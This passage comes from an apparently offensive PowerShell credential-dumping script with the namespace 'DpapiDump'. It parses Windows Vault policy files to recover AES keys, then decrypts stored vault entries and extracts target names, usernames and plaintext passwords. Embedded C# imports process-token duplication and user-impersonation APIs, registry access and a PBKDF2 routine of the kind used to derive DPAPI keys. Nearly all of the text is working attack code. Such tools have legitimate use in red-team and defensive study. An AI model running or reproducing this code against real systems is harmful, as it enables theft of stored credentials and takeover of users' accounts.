    if ($targetAlias) {
        $cred["TargetAlias"] = $targetAlias
    }
    $cred["Password"] = $credBlob
    $cred["Data"] = $unkData
    $cred["Comment"] = $comment
    return (New-Object PSObject -Property $cred)
}

Function Local:Get-PolicyBlob {
    Param (
        [byte[]]
        $DecBlobBytes
    )

    $keys = @{}
    $s = [Text.Encoding]::ASCII.GetString($DecBlobBytes, 12, 4)
    if ($s.Equals("KDBM")) {
        $offset = 20
        $aes128len = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        if ($aes128len -ne 16) {
            Write-Verbose "AES128 key decryption failed (Policy.vpol)"
            return $keys
        }
        $aes128Key = New-Object byte[] $aes128len
        [Array]::Copy($DecBlobBytes, $offset, $aes128Key, 0, $aes128len)
        $offset += $aes128len
        $offset += 20
        $aes256len = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        if ($aes256len -ne 32) {
            Write-Verbose "AES256 key decryption failed (Policy.vpol)"
            return $keys
        }
        $aes256Key = New-Object byte[] $aes256len
        [Array]::Copy($decBlobBytes, $offset, $aes256Key, 0, $aes256len)
        $keys = @{'AES128'=$aes128Key; 'AES256'=$aes256Key}
    }
    else {
        $offset = 16
        $s2 = [Text.Encoding]::ASCII.GetString($decBlobBytes, $offset, 4)
        $offset += 4
        if ($s2.Equals("KSSM")) {
            $offset += 16
            $aes128len = [BitConverter]::ToInt32($decBlobBytes, $offset)
            $offset += 4
            if ($aes128len -ne 16) {
                Write-Verbose "AES128 key decryption failed (Policy.vpol)"
                return $keys
            }
            $aes128Key = New-Object byte[] $aes128len
            [Array]::Copy($decBlobBytes, $offset, $aes128Key, 0, $aes128len)
            $offset += $aes128len
            # Search for the next 'MSSK' header
            [byte[]] $pattern = @( 0x4b, 0x53, 0x53, 0x4d, 0x02, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00 )
            $index = -1
            for ($i = $offset; $i -lt $decBlobBytes.Length - $pattern.Length; $i++) {
                $found = $true
                for ($j = 0; $j -lt $pattern.Length; $j++) {
                    if ($decBlobBytes[$i + $j] -ne $pattern[$j]) {
                        $found = $false
                        break
                    }
                }
                if ($found) {
                    $index = $i
                    break
                }
            }
            if ($index -ne -1) {
                $offset = $index
                $offset += 20
                $aes256len = [BitConverter]::ToInt32($decBlobBytes, $offset)
                $offset += 4
                if ($aes256len -ne 32) {
                    Write-Verbose "AES256 key decryption failed (Policy.vpol)"
                    return $keys
                }
                $aes256Key = New-Object byte[] $aes256len
                [Array]::Copy($decBlobBytes, $offset, $aes256Key, 0, $aes256len)
                $keys = @{'AES128'=$aes128Key; 'AES256'=$aes256Key}
            }
            else {
                Write-Verbose "Policy.vpol decryption failed: second MSSK header not found!"
            }
        }
    }

    return $keys
}

Function Local:Decrypt-VaultCredential {
    Param (
        [byte[]]
        $VaultBytes,

        [byte[]]
        $Aes256Key
    )

    $offset = 0
    $finalAttributeOffset = 0
    $offset += 16
    $unk0 = [BitConverter]::ToInt32($VaultBytes, $offset)
    $offset += 4
    $lastWritten = [BitConverter]::ToInt64($VaultBytes, $offset)
    $offset += 8
    $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
    $offset += 8
    $friendlyNameLen = [BitConverter]::ToInt32($VaultBytes, $offset)
    $offset += 4
    $friendlyName = [Text.Encoding]::Unicode.GetString($VaultBytes, $offset, $friendlyNameLen)
    $offset += $friendlyNameLen
    $attributeMapLen = [BitConverter]::ToInt32($VaultBytes, $offset)
    $offset += 4
    $numberOfAttributes = $attributeMapLen / 12
    $attributeMap = [ordered]@{}
    for ($i = 0; $i -lt $numberOfAttributes; ++$i) {
        $attributeNum = [BitConverter]::ToInt32($VaultBytes, $offset)
        $offset += 4
        $attributeOffset = [BitConverter]::ToInt32($VaultBytes, $offset)
        $offset += 8
        $attributeMap.Add($attributeNum, $attributeOffset)
    }
    $leftover = New-Object byte[] ($VaultBytes.Length - 222)
    [Array]::Copy($VaultBytes, 222, $leftover, 0, $leftover.Length)
    foreach ($attribute in $attributeMap.GetEnumerator()) {
        $attributeOffset = $attribute.Value
        $attributeOffset += 16
        if ($attribute.Key -ge 100) {
            $attributeOffset += 4
        }
        $dataLen = [BitConverter]::ToInt32($VaultBytes, $attributeOffset)
        $attributeOffset += 4
        $finalAttributeOffset = $attributeOffset
        if ($dataLen -gt 0) {
            $IVPresent = [BitConverter]::ToBoolean($VaultBytes, $attributeOffset)
            $attributeOffset += 1
            if ($IVPresent) {
                $IVLen = [BitConverter]::ToInt32($VaultBytes, $attributeOffset)
                $attributeOffset += 4
                $IVBytes = New-Object byte[] $IVLen
                [Array]::Copy($VaultBytes, $attributeOffset, $IVBytes, 0, $IVLen);
                $attributeOffset += $IVLen
                $dataBytes = New-Object byte[] ($dataLen - 1 - 4 - $IVLen)
                [Array]::Copy($VaultBytes, $attributeOffset, $dataBytes, 0, $dataLen - 1 - 4 - $IVLen);
                $attributeOffset += $dataLen - 1 - 4 - $IVLen
                $finalAttributeOffset = $attributeOffset
                $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
                $aesCryptoProvider.Key = $Aes256Key
                if ($IVBytes.Length -ne 0) {
                    $aesCryptoProvider.IV = $IVBytes
                }
                $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
                $decBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
                Write-Output @{'FriendlyName'=$friendlyName; 'DecData'=$decBytes}
            }
            else {
                $finalAttributeOffset = $attributeOffset + $dataLen - 1
            }
        }
    }

    if (($numberOfAttributes -gt 0) -and ($unk0 -lt 4)) {
        $clearOffset = $finalAttributeOffset - 2
        $clearBytes = New-Object byte[] ($VaultBytes.Length - $clearOffset)
        [Array]::Copy($VaultBytes, $clearOffset, $clearBytes, 0, $clearBytes.Length)
        $cleatOffSet2 = 0
        $cleatOffSet2 += 4
        $dataLen = [BitConverter]::ToInt32($clearBytes, $cleatOffSet2)
        $cleatOffSet2 += 4
        if (($dataLen -gt 0) -and ($dataLen -le 2000)) {
            $IVPresent = [BitConverter]::ToBoolean($VaultBytes, $cleatOffSet2)
            $cleatOffSet2 += 1
            if ($IVPresent) {
                $IVLen = [BitConverter]::ToInt32($clearBytes, $cleatOffSet2)
                $cleatOffSet2 += 4
                $IVBytes = New-Object byte[] $IVLen
                [Array]::Copy($clearBytes, $cleatOffSet2, $IVBytes, 0, $IVLen)
                $cleatOffSet2 += $IVLen
                $dataBytes = New-Object byte[] ($dataLen - 1 - 4 - $IVLen)
                [Array]::Copy($clearBytes, $cleatOffSet2, $dataBytes, 0, $dataLen - 1 - 4 - $IVLen)
                $cleatOffSet2 += $dataLen - 1 - 4 - $IVLen
                $finalAttributeOffset = $cleatOffSet2
                $aesCryptoProvider = New-Object Security.Cryptography.AesManaged
                $aesCryptoProvider.Key = $Aes256Key
                if ($IVBytes.Length -ne 0) {
                    $aesCryptoProvider.IV = $IVBytes
                }
                $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC
                $decBytes = $aesCryptoProvider.CreateDecryptor().TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
                Write-Output @{'FriendlyName'=$friendlyName; 'DecData'=$decBytes}
            }
        }
    }
}

Function Local:Get-VaultCredential ([byte[]] $DecBytes) {
    $cred = [ordered]@{}
    $offset = 0
    $version = [BitConverter]::ToInt32($DecBytes, $offset)
    $offset += 4
    $count = [BitConverter]::ToInt32($DecBytes, $offset)
    $offset += 4
    $offset += 4
    for ($i = 0; $i -lt $count; ++$i) {
        $id = [BitConverter]::ToInt32($DecBytes, $offset)
        $offset += 4
        $size = [BitConverter]::ToInt32($DecBytes, $offset)
        $offset += 4
        $entryString = [Text.Encoding]::Unicode.GetString($DecBytes, $offset, $size)
        $entryData = New-Object byte[] $size
        [Array]::Copy($DecBytes, $offset, $entryData, 0, $size)
        $offset += $size
        switch ($id) {
            1 {
                $cred['TargetName'] = $entryString
                break
            }
            2 {
                $cred['UserName'] = $entryString
                break
            }
            3 {
                $cred['Password'] = $entryString
                break
            }
            default {
                try {
                    $cred[$id] = [BitConverter]::ToString($entryData).Replace("-", " ")
                }
                catch {
                    $cred[$id] = $entryString
                }
                break
            }
        }
    }
    return (New-Object PSObject -Property $cred)
}

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

using System.Security.Cryptography;

namespace DpapiDump {
    public class Native {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern IntPtr OpenProcess(
            uint processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool OpenProcessToken(
            IntPtr ProcessHandle,
            uint DesiredAccess,
            out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool DuplicateTokenEx(
            IntPtr hExistingToken,
            uint dwDesiredAccess,
            IntPtr lpTokenAttributes,
            uint ImpersonationLevel,
            uint TokenType,
            out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool ImpersonateLoggedOnUser(
            IntPtr hToken);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern bool RevertToSelf();

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern int RegOpenKeyEx(
            IntPtr hKey,
            string subKey,
            int ulOptions,
            int samDesired,
            out IntPtr hkResult);

        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Auto)]
        public static extern int RegQueryInfoKey(
            IntPtr hkey,
            StringBuilder lpClass,
            ref int lpcbClass,
            int lpReserved,
            out int lpcSubKeys,
            out int lpcbMaxSubKeyLen,
            out int lpcbMaxClassLen,
            out int lpcValues,
            out int lpcbMaxValueNameLen,
            out int lpcbMaxValueLen,
            out int lpcbSecurityDescriptor,
            IntPtr lpftLastWriteTime);

        [DllImport("advapi32.dll", SetLastError=true)]
        public static extern int RegCloseKey(
            IntPtr hKey);
    }

    public class Pbkdf2 {
        public Pbkdf2(HMAC algorithm, Byte[] password, Byte[] salt, Int32 iterations) {
            if (algorithm == null) { throw new ArgumentNullException("algorithm", "Algorithm cannot be null."); }
            if (salt == null) { throw new ArgumentNullException("salt", "Salt cannot be null."); }
            if (password == null) { throw new ArgumentNullException("password", "Password cannot be null."); }
            this.Algorithm = algorithm;
            this.Algorithm.Key = password;
            this.Salt = salt;
            this.IterationCount = iterations;
            this.BlockSize = this.Algorithm.HashSize / 8;
            this.BufferBytes = new byte[this.BlockSize];
        }
        private readonly int BlockSize;
        private uint BlockIndex = 1;
        private byte[] BufferBytes;
        private int BufferStartIndex = 0;
        private int BufferEndIndex = 0;
        public HMAC Algorithm { get; private set; }
        public Byte[] Salt { get; private set; }
        public Int32 IterationCount { get; private set; }
        public Byte[] GetBytes(int count, string algorithm = "sha512") {
            byte[] result = new byte[count];
            int resultOffset = 0;
            int bufferCount = this.BufferEndIndex - this.BufferStartIndex;

            if (bufferCount > 0) { //if there is some data in buffer
                if (count < bufferCount) { //if there is enough data in buffer
                    Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, count);
                    this.BufferStartIndex += count;
                    return result;
                }
                Buffer.BlockCopy(this.BufferBytes, this.BufferStartIndex, result, 0, bufferCount);
                this.BufferStartIndex = this.BufferEndIndex = 0;
                resultOffset += bufferCount;
            }
            while (resultOffset < count) {
                int needCount = count - resultOffset;
                if (algorithm.ToLower() == "sha256")
                    this.BufferBytes = this.Func(false);
                else
                    this.BufferBytes = this.Func();
                if (needCount > this.BlockSize) { //we one (or more) additional passes
                    Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, this.BlockSize);
                    resultOffset += this.BlockSize;
                } else {
                    Buffer.BlockCopy(this.BufferBytes, 0, result, resultOffset, needCount);
                    this.BufferStartIndex = needCount;
                    this.BufferEndIndex = this.BlockSize;
                    return result;
                }
            }
            return result;
        }
        private byte[] Func(bool mscrypto = true) {
            var hash1Input = new byte[this.Salt.Length + 4];
            Buffer.BlockCopy(this.Salt, 0, hash1Input, 0, this.Salt.Length);
            Buffer.BlockCopy(GetBytesFromInt(this.BlockIndex), 0, hash1Input, this.Salt.Length, 4);
            var hash1 = this.Algorithm.ComputeHash(hash1Input);
            byte[] finalHash = hash1;
            for (int i = 2; i <= this.IterationCount; i++) {
                hash1 = this.Algorithm.ComputeHash(hash1, 0, hash1.Length);
                for (int j = 0; j < this.BlockSize; j++) {
                    finalHash[j] = (byte)(finalHash[j] ^ hash1[j]);
                }
                if (mscrypto)
                    Array.Copy(finalHash, hash1, hash1.Length);
            }
            if (this.BlockIndex == uint.MaxValue) { throw new InvalidOperationException("Derived key too long."); }
            this.BlockIndex += 1;
            return finalHash;
        }
        private static byte[] GetBytesFromInt(uint i) {
            var bytes = BitConverter.GetBytes(i);
            if (BitConverter.IsLittleEndian) {
                return new byte[] { bytes[3], bytes[2], bytes[1], bytes[0] };
            } else {
                return bytes;
            }
        }
    }
}
"@
